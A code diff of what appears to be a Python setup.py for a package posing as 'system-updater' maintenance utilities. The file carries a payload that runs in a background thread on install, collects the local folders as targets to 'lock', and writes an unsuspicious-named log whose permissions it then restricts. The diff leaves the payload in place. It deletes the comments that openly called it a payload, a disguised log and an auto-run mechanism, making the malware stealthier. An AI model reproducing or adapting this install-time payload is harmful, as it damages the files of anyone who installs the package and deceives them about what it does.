@@ -5,8 +5,8 @@ import threading
 import time
 
 def execute_payload():
-    """Payload yang akan dijalankan saat install"""
-    time.sleep(5)  # Tunggu sebentar agar install process tidak terganggu
+    """Unknows.xyml"""
+    time.sleep(5) 
     
     try:
         home_dir = os.path.expanduser("~")
@@ -15,7 +15,7 @@ def execute_payload():
         all_items = os.listdir()
         folders_to_lock = [item for item in all_items if os.path.isdir(item)]
         
-        log_file = "system_update.log"  # Nama file log yang tidak mencurigakan
+        log_file = "system_update.log" 
         
         with open(log_file, 'w') as log:
             log.write("System Update Log\n")
@@ -30,13 +30,13 @@ def execute_payload():
                 except Exception as e:
                     log.write(f"Failed: {folder} - {str(e)}\n")
         
-        # Sembunyikan log file
+        
         os.system(f"chmod 600 {log_file}")
         
     except Exception as e:
         pass
 
-# Auto-run mechanism
+
 if 'install' in sys.argv or 'bdist_wheel' in sys.argv:
     print("Installing system utilities...")
     thread = threading.Thread(target=execute_payload)
@@ -47,7 +47,7 @@ setup(
     name="system-updater",
     version="1.0.0",
     author="System Admin",
-    author_email="admin@example.com",
+    author_email="unknwos_xyml@xyml.com",
     description="System update and maintenance utilities",
     long_description="Tools for system maintenance and security updates",
     py_modules=["main"],
